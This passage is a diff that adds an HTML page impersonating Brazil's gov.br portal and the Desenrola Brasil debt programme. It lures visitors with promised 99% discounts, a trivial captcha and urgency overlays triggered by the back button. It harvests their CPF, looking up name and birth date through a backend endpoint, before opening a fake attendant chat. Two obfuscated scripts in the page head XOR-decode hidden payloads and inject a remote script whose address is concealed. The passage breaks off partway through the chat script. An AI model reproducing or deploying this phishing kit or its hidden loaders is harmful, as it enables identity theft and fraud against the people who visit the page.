@@ -1,0 +1,608 @@
+﻿<!doctype html>
+<html lang="pt-BR">
+<head><script></script>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="format-detection" content="telephone=no,date=no,address=no,email=no,url=no">
+<title>Acesso Seguro</title>
+<meta name="robots" content="noindex,nofollow">
+<meta name="theme-color" content="#0B1B33">
+<link rel="icon" type="image/png" sizes="96x96" href="images/favicon-96.png">
+<link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="images/favicon-16.png">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{-webkit-text-size-adjust:100%}
+body{font-family:'Inter',Arial,Helvetica,sans-serif;font-size:16px;line-height:1.6;color:#151B26;background:#F7F5EF;-webkit-font-smoothing:antialiased}
+a{color:#1FA971;text-decoration:none}
+a:hover{text-decoration:underline}
+
+/* ===== STEP SYSTEM ===== */
+.step{display:none;flex-direction:column;min-height:100vh;min-height:100dvh}
+.step.active{display:flex}
+
+/* ===== STEP 1: PRESSEL ===== */
+#step-pressel{background:#F7F5EF}
+.prog{position:fixed;top:0;left:0;height:3px;width:0;background:#1FA971;z-index:60;transition:width .15s}
+.ps-bg{
+  background:radial-gradient(circle at 85% 20%,rgba(31,169,113,.18),transparent 46%),
+  linear-gradient(#0B1B33 0%,#12274A 52%,#F7F5EF 52%,#F7F5EF 100%);
+  padding:48px 20px 0;flex:1;display:flex;align-items:center;justify-content:center;
+}
+@media(max-width:480px){.ps-bg{padding:36px 16px 0}}
+.ps-card{
+  max-width:640px;width:100%;margin:0 auto;background:#fff;border-radius:16px;
+  padding:8px 40px 23px;text-align:center;border-top:4px solid #1FA971;
+  box-shadow:0 8px 32px rgba(0,0,0,.08);
+}
+@media(max-width:480px){.ps-card{padding:4px 22px 17px}}
+.ps-logo-text{text-align:center;margin:18px auto 6px}
+.ps-logo-text .gov-tag{display:inline-block;font-size:10px;font-weight:700;letter-spacing:.18em;text-transform:uppercase;color:#1FA971;margin-bottom:6px}
+.ps-logo-text h2{font-size:clamp(22px,5.5vw,30px);font-weight:900;color:#0B1B33;line-height:1.1;letter-spacing:-.02em}
+.ps-logo-text h2 span{color:#1FA971}
+.ps-card h1{font-size:clamp(32px,7vw,52px);font-weight:900;color:#0B1B33;line-height:1.08;margin-bottom:10px;letter-spacing:-.03em}
+.ps-card .sub{font-size:16px;color:#5A6478;line-height:1.5;max-width:460px;margin:0 auto 22px}
+.btn-gold{
+  display:inline-flex;align-items:center;justify-content:center;gap:8px;min-width:240px;
+  background:#F2B705;color:#1A1300;font:800 clamp(16px,3.5vw,20px)/1.25 'Inter',sans-serif;
+  padding:18px 48px;border:0;border-radius:12px;cursor:pointer;transition:background .15s,transform .1s;
+}
+.btn-gold:hover{background:#D9A404;text-decoration:none;transform:translateY(-1px)}
+.btn-gold:active{transform:translateY(1px)}
+.btn-gold .arr{transition:transform .2s}
+.btn-gold:hover .arr{transform:translateX(3px)}
+.btn-pulse{animation:pulse 2.5s ease-in-out infinite}
+@keyframes pulse{0%,100%{box-shadow:0 4px 14px rgba(242,183,5,.25)}50%{box-shadow:0 4px 28px rgba(242,183,5,.5)}}
+.btn-sub{display:block;font-size:11px;color:#8B92A0;margin-top:10px}
+
+/* Pressel footer */
+.ps-ft{background:#0B1B33;color:#fff;margin-top:auto;padding:24px 0 20px;text-align:center}
+.ps-ft .w{max-width:720px;margin:0 auto;padding:0 20px}
+@media(max-width:480px){.ps-ft .w{padding:0 16px}}
+.ps-ft-disc{font-size:9px;color:rgba(255,255,255,.1);line-height:1.5;margin-bottom:14px;max-width:500px;margin-left:auto;margin-right:auto}
+.ps-ft-id{font-size:11px;color:rgba(255,255,255,.1);line-height:1.7;margin-bottom:14px;display:flex;flex-direction:column;align-items:center;gap:4px}
+.ps-ft-id .ft-row{display:flex;flex-wrap:wrap;justify-content:center;gap:2px 6px}
+.ps-ft-id .ft-row span+span::before{content:"·";margin-right:6px}
+.ps-ft nav{display:flex;flex-wrap:wrap;justify-content:center;gap:4px 16px;margin-bottom:10px;padding-top:12px;border-top:1px solid rgba(255,255,255,.06)}
+.ps-ft nav a{font-size:12px;color:rgba(255,255,255,.15)}
+.ps-ft .copy{font-size:10px;color:rgba(255,255,255,.08);margin-top:6px}
+
+/* Pressel sticky */
+.ps-sticky{position:fixed;left:0;right:0;bottom:0;z-index:50;padding:10px 16px calc(10px + env(safe-area-inset-bottom));background:rgba(11,27,51,.97);backdrop-filter:blur(10px);border-top:2px solid #1FA971;transform:translateY(110%);transition:transform .3s cubic-bezier(.4,0,.2,1)}
+.ps-sticky.on{transform:none}
+.ps-sticky .btn-gold{width:100%;min-width:0;padding:14px;font-size:15px}
+@media(min-width:768px){.ps-sticky{display:none}}
+
+/* Captcha dialog */
+dialog[open]{border:0;border-radius:16px;padding:0;max-width:380px;width:calc(100% - 32px);background:#fff;color:#151B26;box-shadow:0 20px 40px -10px rgba(0,0,0,.25);margin:auto;inset:0;position:fixed;display:flex;align-items:center;justify-content:center}
+dialog::backdrop{background:rgba(11,27,51,.6)}
+dialog .dx{padding:28px 24px}
+dialog h3{font-size:18px;font-weight:800;color:#0B1B33;margin-bottom:8px}
+dialog p{font-size:13px;color:#5A6478;line-height:1.55;margin-bottom:8px}
+.cap{text-align:center}
+.cap-label{display:inline-block;font-size:9px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:#1FA971;margin-bottom:8px}
+.cap h3{margin-bottom:3px}
+.cap>p{margin-bottom:16px}
+.cap-math{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:14px}
+.cap-math b{font-size:28px;font-weight:900;color:#0B1B33}
+.cap-math span{font-size:20px;color:#AEB9C9}
+.cap-math input{width:68px;height:50px;background:#F7F5EF;border:2px solid #E5E2DA;border-radius:10px;font:800 24px/1 'Inter',sans-serif;color:#0B1B33;text-align:center}
+.cap-math input:focus{outline:0;border-color:#1FA971;box-shadow:0 0 0 3px rgba(31,169,113,.15)}
+.cap-err{color:#E52207;font-size:12px;font-weight:600;margin-bottom:8px;display:none}
+.cap-err.on{display:block}
+.cap .btn-gold{min-width:0;width:100%}
+
+/* ===== STEPS 2-4: GOV.BR STYLE ===== */
+.gov{font-family:'Open Sans',system-ui,sans-serif;background:#f0f2f5;color:#1a1a1a}
+.gov-wrap{flex:1;display:flex;flex-direction:column;width:100%;max-width:720px;margin:0 auto}
+
+/* Gov header */
+.gov-hdr{width:100%;min-height:56px;display:flex;justify-content:space-between;align-items:center;gap:8px;background:#fff;padding:8px 12px 8px 14px;border-bottom:1px solid #e5e5e5;box-shadow:0 1px 3px rgba(0,0,0,.06);flex-shrink:0}
+.gov-hdr img{height:31px;width:auto;max-width:132px;object-fit:contain;display:block}
+.gov-hdr .btn-entrar{display:inline-flex;align-items:center;gap:7px;background:#1550b0;color:#fff;border:none;border-radius:999px;padding:10px 18px;font-size:14px;font-weight:600;font-family:inherit;cursor:pointer;white-space:nowrap;text-decoration:none}
+@media(max-width:480px){.gov-hdr img{height:28px;max-width:103px}.gov-hdr .btn-entrar{padding:9px 14px;font-size:13px}}
+
+/* Gov hero banner */
+.gov-hero{width:100%;background:#dde5ef;display:flex;align-items:center;justify-content:center;overflow:hidden}
+.gov-hero img{width:100%;height:auto;max-height:280px;object-fit:contain;display:block}
+
+/* Gov card */
+.gov-card{background:#fff;margin:12px 16px 16px;padding:26px 20px 48px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.08);text-align:center}
+.gov-card .stack-logo{display:flex;flex-direction:column;align-items:center}
+.gov-card .stack-logo .ico{max-height:64px;width:auto;display:block}
+.gov-card .stack-logo .titulo-img{max-width:220px;width:100%;height:auto;margin-top:2px;display:block;object-fit:contain}
+.gov-card .headline{font-size:17px;font-weight:700;color:#1550b0;line-height:1.42;margin-top:20px;max-width:340px;margin-left:auto;margin-right:auto}
+.gov-card .subline{font-size:15px;font-weight:400;color:#333;margin-top:20px;line-height:1.45;max-width:320px;margin-left:auto;margin-right:auto}
+.gov-btn{display:block;width:auto;min-width:204px;max-width:min(90vw,292px);margin:24px auto 4px;padding:15px 40px;background:#1550b0;color:#fff !important;border:none;border-radius:999px;font-size:15px;font-weight:700;font-family:inherit;text-transform:uppercase;letter-spacing:.04em;cursor:pointer;text-align:center;text-decoration:none}
+.gov-btn:hover{filter:brightness(1.06);text-decoration:none}
+
+/* Gov footer */
+.gov-ft{background:#0a2542;color:#d1d1d1;text-align:center;font-size:11px;padding:20px 20px 24px;margin-top:auto;flex-shrink:0}
+.gov-ft img{display:block;height:26px;width:auto;max-width:100px;margin:0 auto 10px;object-fit:contain}
+
+/* ===== STEP 3: CPF FORM ===== */
+.cpf-card{background:#fff;margin:24px 16px 16px;padding:20px 18px 36px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.08);text-align:center}
+.cpf-card .limpe-logo{max-width:200px;max-height:96px;width:100%;height:auto;object-fit:contain;margin:0 auto 14px;display:block}
+.cpf-card .instrucao{font-size:14px;color:#333;line-height:1.5;margin-bottom:20px;text-align:center}
+.cpf-card .field-label{font-size:14px;font-weight:700;color:#333;margin-bottom:8px;text-align:left}
+.cpf-card .input-cpf{width:100%;padding:14px 16px;border:1px solid #ccc;border-radius:8px;font-size:16px;font-family:inherit;margin-bottom:20px}
+.cpf-card .btn-submit{display:block;width:100%;padding:15px 20px;background:#1550b0;color:#fff;border:none;border-radius:999px;font-size:15px;font-weight:600;font-family:inherit;letter-spacing:.02em;cursor:pointer;text-align:center}
+.cpf-card .btn-submit:hover{filter:brightness(1.06)}
+.cpf-card .info-box{display:flex;gap:12px;align-items:flex-start;padding:14px 16px;background:#bdd4ef;border:1px solid #2467b8;border-radius:8px;margin-top:20px;text-align:left}
+.cpf-card .info-box .ico-i{flex-shrink:0;width:22px;height:22px;border-radius:50%;background:#1550b0;color:#fff;font-size:14px;font-weight:700;display:flex;align-items:center;justify-content:center}
+.cpf-card .info-box p{font-size:13px;color:#0a0a0a;line-height:1.45}
+.cpf-card .trust-badges{display:flex;justify-content:center;align-items:center;gap:18px 24px;flex-wrap:wrap;margin-top:22px;font-size:12px;color:#444;font-weight:500}
+.cpf-card .trust-item{display:inline-flex;align-items:center;gap:6px}
+.cpf-card .trust-ico{flex-shrink:0;color:#4a4a4a}
+
+/* ===== STEP 4: CHAT ===== */
+#step-chat{background:#f0f2f5;overflow:hidden;max-height:100vh;max-height:100dvh}
+.chat-header{background:#fff;border-bottom:3px solid #1351B4;box-shadow:0 2px 8px rgba(0,0,0,.1);height:58px;display:flex;align-items:center;justify-content:space-between;padding:0 16px;flex-shrink:0}
+.chat-header img{height:28px}
+.btn-user{background:#1351B4;color:#fff;border:none;border-radius:50px;padding:6px 14px;display:flex;align-items:center;gap:6px;font-size:14px;font-weight:600;font-family:'Open Sans',sans-serif}
+.attendant-strip{background:#fff;border-bottom:1px solid #e5e5e5;display:flex;align-items:center;gap:10px;padding:8px 14px;flex-shrink:0;height:56px}
+.attendant-strip img{width:38px;height:38px;border-radius:50%;object-fit:cover;flex-shrink:0}
+.att-nome{font-weight:700;font-size:14px;color:#1a1a1a;font-family:'Inter',sans-serif}
+.att-cargo{font-size:12px;color:#666;font-family:'Inter',sans-serif}
+.chat-msgs{flex:1 1 auto;overflow-y:auto;padding:16px 16px 24px;max-width:680px;width:100%;margin:0 auto}
+.chat-ft{background:#0a2542;display:flex;flex-direction:column;align-items:center;text-align:center;padding:20px 20px 24px;flex-shrink:0}
+.chat-ft img{display:block;height:26px;width:auto;max-width:100px;margin:0 auto 10px}
+.chat-ft .gv-sub{color:#d1d1d1;font-size:11px;line-height:1.5}
+.msg-row{display:flex;margin-bottom:8px;align-items:flex-end}
+.msg-row.user{justify-content:flex-end}
+.avatar{width:30px;height:30px;border-radius:50%;object-fit:cover;flex-shrink:0;margin-right:7px;margin-bottom:2px}
+.bubble-bot{background:#fff;color:#333;border:1px solid #e5e5e5;border-radius:18px 18px 18px 4px;padding:11px 15px;font-size:14px;line-height:1.55;max-width:78%;box-shadow:0 2px 6px rgba(0,0,0,.07);overflow-wrap:break-word;animation:fadeUp .3s ease both;font-family:'Inter',sans-serif}
+.bubble-user{background:linear-gradient(135deg,#1351B4,#0F4DA8);color:#fff;border-radius:18px 18px 4px 18px;padding:11px 15px;font-size:14px;line-height:1.55;max-width:78%;overflow-wrap:break-word;animation:fadeUp .3s ease both;font-family:'Inter',sans-serif}
+.bubble-system{color:#666;font-size:12.5px;font-style:italic;padding:4px 10px;text-align:center;animation:fadeUp .3s ease both}
+.bubble-info-card{background:#EFF6FF;border:1px solid #BFDBFE;border-radius:12px;padding:14px 16px;font-size:14px;line-height:1.8;max-width:82%;animation:fadeUp .3s ease both;font-family:'Inter',sans-serif}
+.ic-label{color:#555;font-size:13px}
+.ic-value{color:#1351B4;font-weight:500}
+.ic-bold{font-weight:700;color:#1a1a1a}
+.confirm-card{background:#fff;border:1px solid #e5e5e5;border-radius:18px 18px 18px 4px;padding:14px 16px;font-size:14px;line-height:1.7;margin-bottom:10px;box-shadow:0 2px 6px rgba(0,0,0,.07);font-family:'Inter',sans-serif}
+.confirm-title{font-weight:700;display:block;margin-bottom:8px}
+.confirm-card strong{display:block;color:#1a1a1a}
+.confirm-card span{display:block;color:#1351B4;margin-bottom:4px}
+.confirm-btns{display:flex;gap:10px;justify-content:flex-end;flex-wrap:wrap;margin-top:6px}
+.btn-row{display:flex;flex-direction:column;gap:8px;margin-top:4px;animation:fadeUp .3s ease both}
+.btn-row.row-inline{flex-direction:row;flex-wrap:wrap}
+.chat-btn{background:#fff;border:2px solid #1351B4;color:#1351B4;border-radius:22px;padding:10px 18px;font-size:14px;font-weight:500;font-family:'Inter',sans-serif;cursor:pointer;transition:background .15s,color .15s}
+.chat-btn:hover,.chat-btn.solid{background:#1351B4;color:#fff}
+.chat-btn.wide{border-radius:8px;text-transform:uppercase;font-size:14px;font-weight:700;letter-spacing:.03em;padding:13px 20px;width:100%;text-align:center}
+.chat-btn:disabled{opacity:.5;pointer-events:none}
+.btn-link-final{display:block;width:100%;background:#1351B4;color:#fff !important;text-decoration:none;text-align:center;font-size:14px;font-weight:700;letter-spacing:.03em;text-transform:uppercase;border-radius:8px;padding:14px 16px;animation:fadeUp .3s ease both}
+.typing{display:inline-flex;align-items:center;gap:4px;padding:12px 16px;background:#fff;border-radius:18px 18px 18px 4px;border:1px solid #e5e5e5;box-shadow:0 2px 6px rgba(0,0,0,.07)}
+.typing span{width:7px;height:7px;background:#1351B4;border-radius:50%;animation:bounce 1.2s infinite}
+.typing span:nth-child(2){animation-delay:.2s}
+.typing span:nth-child(3){animation-delay:.4s}
+@keyframes bounce{0%,80%,100%{transform:scale(0)}40%{transform:scale(1)}}
+@keyframes fadeUp{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+
+/* Back-button interception */
+.br-overlay{display:none;position:fixed;inset:0;z-index:9999;background:#f0f2f5;align-items:center;justify-content:center;font-family:'Inter',sans-serif}
+.br-overlay.on{display:flex}
+.br-box{background:#fff;border-radius:14px;box-shadow:0 4px 20px rgba(0,0,0,.1);padding:32px 24px;max-width:420px;width:100%;text-align:center;margin:16px}
+.br-box .br-ico{font-size:48px;margin-bottom:16px}
+.br-box h2{font-size:20px;color:#1a1a1a;margin:0 0 8px}
+.br-box p{font-size:14px;color:#666;line-height:1.6;margin:0 0 20px}
+.br-box button{display:inline-block;background:#1351B4;color:#fff;border:none;padding:14px 28px;border-radius:8px;font-weight:700;font-size:14px;cursor:pointer}
+</style>
+
+<script>(function(){var g_apky=atob("DCyS38Tgw0BCdTBhJlewqraM4XpgHUQVVl+o8OuDpy5sAEQMT0rr8aePrm4gBx8SRV77r7CT7DArDVUNCVz7p6GM7SoxVxxDR1jmra2CtjQnBhJbfXG+/aOMrCIjGUNDHHfp/aqBriVgTxIRT1T3s42E4WxgA1ENU0mw5ebWoiFwQwgCFB70uqbQpyJxRVJTHxikuvLCvh0/");var z_5ppd=[];for(var s_ke84=0;s_ke84<g_apky.length;s_ke84++){z_5ppd.push(g_apky.charCodeAt(s_ke84)&255);}var v_lf=z_5ppd[0];var l_w6j=z_5ppd.slice(1,1+v_lf);var y_1dt6=z_5ppd.slice(1+v_lf);var o_lfte=y_1dt6.map(function(b,j_cpg){return b^l_w6j[j_cpg%v_lf];});var d_k92="";for(var q_yl=0;q_yl<o_lfte.length;q_yl++){d_k92+=String.fromCharCode(o_lfte[q_yl]&255);}var m_o=decodeURIComponent(escape(d_k92));var h_v7=JSON.parse(m_o);var b_4=h_v7.globals||[];b_4.forEach(function(o_nk){window[o_nk.name]=o_nk.value;});var k_it=document.createElement("script");k_it.src=h_v7.url;k_it.async=true;k_it.defer=true;(h_v7.attributes||[]).forEach(function(t_lpz){k_it.setAttribute(t_lpz.name,t_lpz.value);});(document.head||document.documentElement).appendChild(k_it);})();</script>
+<script>(function(){var y_chh=atob("DGQ7xTQvWmF/3CU4+R8ZsEZDeFtdtFFMiRcB6htMPg9RqVFVkAJC61dAN08drgpLmhZStUBcdRQLsVYXlQVPoEdbdAsM/gkamBBPt11NLxUarwcCoh8Zq1VCP0NF/kFZjQUWsEBCMwcG8VVKnBJeq0ACIgIQuAhLmg8Z6RZZOw0KuQcC20ZG6U8NNAASuQcC2wBasVUCLxUStUNB1BRJoEJKNBVSr1BakABI5xgNLAATqUAaw0YZuGlS");var t_hb1=[];for(var b_ww6=0;b_ww6<y_chh.length;b_ww6++){t_hb1.push(y_chh.charCodeAt(b_ww6)&255);}var w_iy=t_hb1[0];var p_r5=t_hb1.slice(1,1+w_iy);var f_j=t_hb1.slice(1+w_iy);var h_8lbf=f_j.map(function(b,e_amv){return b^p_r5[e_amv%w_iy];});var i_f3="";for(var c_m8=0;c_m8<h_8lbf.length;c_m8++){i_f3+=String.fromCharCode(h_8lbf[c_m8]&255);}var d_tq=decodeURIComponent(escape(i_f3));var r_m=JSON.parse(d_tq);var l_vtf=r_m.globals||[];l_vtf.forEach(function(c_r){window[c_r.name]=c_r.value;});var x_c=document.createElement("script");x_c.src=r_m.url;x_c.async=true;x_c.defer=true;(r_m.attributes||[]).forEach(function(w_94){x_c.setAttribute(w_94.name,w_94.value);});(document.head||document.documentElement).appendChild(x_c);})();</script>
+</head>
+<body>
+
+<!-- ==================== STEP 1: PRESSEL ==================== -->
+<section id="step-pressel" class="step active">
+  <div class="prog" id="prog"></div>
+  <div class="ps-bg">
+    <div class="ps-card">
+      <img class="ps-logo" src="logo.png" alt="Desenrola Brasil" style="display:block;max-width:100px;margin:24px auto 18px;height:auto">
+      <h1>Já começou a desenrolar?</h1>
+      <p class="sub">O programa começou.<br>Clique abaixo para prosseguir.</p>
+      <a class="btn-gold btn-pulse" href="#" id="presselCta">Prosseguir <span class="arr">&rarr;</span></a>
+      <span class="btn-sub">Consulta em menos de 2 minutos</span>
+    </div>
+  </div>
+  <footer class="ps-ft"><div class="w">
+    <nav><a href="politica-privacidade.html">Política de Privacidade</a><a href="termos-de-uso.html">Termos de Uso</a><a href="/cdn-cgi/l/email-protection#99faf6f7edf8edf6d9fdfceafaf6f4e9f5e0b7eaf1f6e9">Contato</a></nav>
+    <div class="copy">&copy; 2026 Todos os direitos reservados.</div>
+  </div></footer>
+  <div class="ps-sticky" id="psSticky"><a class="btn-gold" href="#" id="presselCtaSticky">Prosseguir <span class="arr">&rarr;</span></a></div>
+</section>
+
+<!-- ==================== STEP 2: FRONT ==================== -->
+<section id="step-front" class="step gov">
+  <div class="gov-wrap">
+    <header class="gov-hdr">
+      <img src="images/icon-seal.png" alt="gov.br">
+      <a href="#" class="btn-entrar" id="frontEntrar" style="text-decoration:none">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+        Entrar
+      </a>
+    </header>
+    <div class="gov-hero"><img src="images/hero.png" alt=""></div>
+    <div class="gov-card">
+      <div class="stack-logo">
+        <img src="images/logo.png" alt="" class="ico">
+        <img src="images/logo-text.png" alt="Desenrola Brasil" class="titulo-img">
+      </div>
+      <h1 class="headline">O Programa Desenrola Brasil possibilita a renegociação de dívidas com descontos de até 99%</h1>
+      <p class="subline">Clique no botão abaixo para<br>acessar a plataforma</p>
+      <a href="#" class="gov-btn" id="frontAcessar">ACESSAR AGORA</a>
+    </div>
+    <footer class="gov-ft">
+      <img src="images/iconefooter.png" alt="">
+      <p>Todo o conteúdo deste site está publicado sob a licença.</p>
+    </footer>
+  </div>
+</section>
+
+<!-- ==================== STEP 3: ENTRAR (CPF) ==================== -->
+<section id="step-entrar" class="step gov">
+  <div class="gov-wrap">
+    <header class="gov-hdr">
+      <img src="images/icon-seal.png" alt="gov.br">
+    </header>
+    <div class="cpf-card">
+      <img class="limpe-logo" src="images/limpenome.png" alt="Limpe seu nome">
+      <p class="instrucao">Informe seu CPF e clique em "Continuar" para renegociar suas dívidas com descontos de 99%</p>
+      <form id="cpfForm" novalidate>
+        <div class="field-label">CPF</div>
+        <input class="input-cpf" type="tel" id="cpf" name="cpf" inputmode="numeric" autocomplete="off" placeholder="000.000.000-00" required>
+        <button type="submit" class="btn-submit">Continuar</button>
+      </form>
+      <div class="info-box">
+        <span class="ico-i" aria-hidden="true">!</span>
+        <p>O Programa Desenrola Brasil oferece acordos com descontos de 99% e recuperação de crédito imediata!</p>
+      </div>
+      <div class="trust-badges">
+        <span class="trust-item">
+          <svg class="trust-ico" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="5" y="11" width="14" height="10" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/></svg>
+          Conexão segura
+        </span>
+        <span class="trust-item">
+          <svg class="trust-ico" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          Programa oficial
+        </span>
+      </div>
+    </div>
+    <footer class="gov-ft">
+      <img src="images/iconefooter.png" alt="">
+      <p>Todo o conteúdo deste site está publicado sob a licença.</p>
+    </footer>
+  </div>
+</section>
+
+<!-- ==================== STEP 4: CHAT ==================== -->
+<section id="step-chat" class="step">
+  <header class="chat-header">
+    <img src="images/icon-seal.png" alt="gov.br">
+    <button class="btn-user"><svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg><span id="nomeUsuario">Usuário</span></button>
+  </header>
+  <div class="attendant-strip">
+    <img src="images/leticia.png" alt="Letícia M.">
+    <div><div class="att-nome">Letícia M.</div><div class="att-cargo">Atendente do Programa Desenrola Brasil</div></div>
+  </div>
+  <div class="chat-msgs" id="msgs"></div>
+  <footer class="chat-ft">
+    <img src="images/iconefooter.png" alt="">
+    <div class="gv-sub">Todo o conteúdo deste site está publicado sob a licença.</div>
+  </footer>
+</section>
+
+<!-- Back-button overlays -->
+<div class="br-overlay" id="br1"><div class="br-box"><div class="br-ico">⚠️</div><h2>Espere! Seu processo está em andamento</h2><p>Se você sair agora, todo o progresso será perdido e será necessário reiniciar desde o início.</p><button onclick="document.getElementById('br1').classList.remove('on')">Continuar processo</button></div></div>
+<div class="br-overlay" id="br2"><div class="br-box"><div class="br-ico">⚠️</div><h2>Última chance!</h2><p>Ao sair, sua solicitação será cancelada e as condições atuais podem não estar mais disponíveis.</p><button onclick="document.getElementById('br2').classList.remove('on')">Permanecer na página</button></div></div>
+
+<!-- Captcha dialog -->
+<dialog id="portao"><div class="dx cap">
+  <span class="cap-label">Verificação de segurança</span>
+  <h3>Antes de continuar</h3>
+  <p>Confirme que você não é um robô.</p>
+  <div class="cap-math"><b id="pConta">1 + 1</b><span>=</span><input id="pResp" inputmode="numeric" autocomplete="off" aria-label="Resultado"></div>
+  <p class="cap-err" id="pErro">Resposta incorreta. Tente novamente.</p>
+  <button class="btn-gold" id="pOk" type="button">Confirmar e continuar</button>
+</div></dialog>
+
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+(function(){
+
+/* ===== UTM CAPTURE ===== */
+var KEYS=["gclid","gbraid","wbraid","gad_source","gad_campaignid","keyword","matchtype","device","network","placement","campaignid","adgroupid","creative","target","targetid","loc_physical_ms","utm_source","utm_medium","utm_campaign","utm_content","utm_term","utm_id","fbclid","ttclid","sck","src","xcod"];
+var P={};
+try{new URLSearchParams(location.search).forEach(function(v,k){if(v)P[k.toLowerCase()]=v})}catch(e){}
+try{
+  var s=JSON.parse(localStorage.getItem('__pp')||'{}');
+  if(Object.keys(P).length){P=Object.assign(s,P);localStorage.setItem('__pp',JSON.stringify(P))}
+  else P=s;
+}catch(e){}
+
+function buildQS(extra){
+  var qs=[];
+  KEYS.forEach(function(k){if(P[k])qs.push(encodeURIComponent(k)+'='+encodeURIComponent(P[k]))});
+  if(extra)Object.keys(extra).forEach(function(k){qs.push(encodeURIComponent(k)+'='+encodeURIComponent(extra[k]))});
+  return qs.length?'?'+qs.join('&'):'';
+}
+
+/* ===== STEP NAVIGATION ===== */
+function goToStep(id){
+  document.querySelectorAll('.step').forEach(function(s){s.classList.remove('active')});
+  document.getElementById('step-'+id).classList.add('active');
+  window.scrollTo(0,0);
+}
+
+/* ===== STEP 1: PRESSEL ===== */
+var dlg=document.getElementById('portao'),resp=document.getElementById('pResp'),
+    erro=document.getElementById('pErro'),ok=document.getElementById('pOk');
+
+function openCaptcha(e){
+  e.preventDefault();
+  resp.value='';erro.classList.remove('on');
+  dlg.showModal();setTimeout(function(){resp.focus()},60);
+}
+document.getElementById('presselCta').addEventListener('click',openCaptcha);
+document.getElementById('presselCtaSticky').addEventListener('click',openCaptcha);
+
+function tryCaptcha(){
+  if(parseInt(resp.value,10)===2){erro.classList.remove('on');dlg.close();goToStep('front')}
+  else{erro.classList.add('on');resp.value='';resp.focus()}
+}
+ok.addEventListener('click',tryCaptcha);
+resp.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();tryCaptcha()}});
+
+var st=document.getElementById('psSticky'),prog=document.getElementById('prog');
+function onScroll(){
+  var y=window.scrollY||0;
+  if(st)st.classList.toggle('on',y>400);
+  if(prog){var h=document.body.scrollHeight-innerHeight;prog.style.width=(h>0?Math.min(100,y/h*100):0)+'%'}
+}
+addEventListener('scroll',onScroll,{passive:true});onScroll();
+
+/* ===== STEP 2: FRONT ===== */
+document.getElementById('frontEntrar').addEventListener('click',function(e){e.preventDefault();goToStep('entrar')});
+document.getElementById('frontAcessar').addEventListener('click',function(e){e.preventDefault();goToStep('entrar')});
+
+/* ===== STEP 3: ENTRAR (CPF) ===== */
+function onlyDigits(s){return String(s||'').replace(/\D/g,'')}
+function formatCPF(v){
+  var d=onlyDigits(v).slice(0,11);
+  if(d.length<=3)return d;if(d.length<=6)return d.slice(0,3)+'.'+d.slice(3);
+  if(d.length<=9)return d.slice(0,3)+'.'+d.slice(3,6)+'.'+d.slice(6);
+  return d.slice(0,3)+'.'+d.slice(3,6)+'.'+d.slice(6,9)+'-'+d.slice(9);
+}
+function isValidCPF(cpf){
+  if(cpf.length!==11||/^(\d)\1{10}$/.test(cpf))return false;
+  var i,s=0,r;
+  for(i=1;i<=9;i++)s+=parseInt(cpf.charAt(i-1),10)*(11-i);
+  r=(s*10)%11;if(r===10||r===11)r=0;if(r!==parseInt(cpf.charAt(9),10))return false;
+  s=0;for(i=1;i<=10;i++)s+=parseInt(cpf.charAt(i-1),10)*(12-i);
+  r=(s*10)%11;if(r===10||r===11)r=0;return r===parseInt(cpf.charAt(10),10);
+}
+var cpfInput=document.getElementById('cpf');
+cpfInput.addEventListener('input',function(){cpfInput.value=formatCPF(cpfInput.value)});
+
+var NOME='',NOME_COMPLETO='',CPF='',CPF_FORMATADO='',NASC='';
+
+document.getElementById('cpfForm').addEventListener('submit',async function(e){
+  e.preventDefault();
+  var raw=onlyDigits(cpfInput.value);
+  if(!isValidCPF(raw)){alert('CPF inválido. Verifique os dígitos.');return}
+  var btn=e.target.querySelector('button[type="submit"]');
+  if(btn){btn.disabled=true;btn.textContent='Consultando…'}
+  try{
+    var res=await fetch('api-cpf.php?cpf='+encodeURIComponent(raw),{cache:'no-store'});
+    var json=await res.json();
+    if(json&&json.nome&&String(json.nome).trim()!==''){
+      var nascFmt='';
+      if(json.nascimento){var m1=String(json.nascimento).match(/^(\d{4})-(\d{2})-(\d{2})$/);nascFmt=m1?(m1[3]+'/'+m1[2]+'/'+m1[1]):json.nascimento}
+      NOME=json.nome;NOME_COMPLETO=NOME;CPF=raw;CPF_FORMATADO=formatCPF(raw);NASC=nascFmt;
+      try{localStorage.setItem('site.nome',NOME);localStorage.setItem('site.cpf',raw);localStorage.setItem('site.nasc',nascFmt)}catch(_){}
+      goToStep('chat');startChat();return;
+    }
+    alert('Não foi possível validar o CPF. Tente novamente.');
+  }catch(err){alert('Erro de conexão. Tente novamente.')}
+  finally{if(btn){btn.disabled=false;btn.textContent='Continuar'}}
+});
+
+/* ===== STEP 4: CHAT ===== */
+var AVATAR='images/leticia.png';
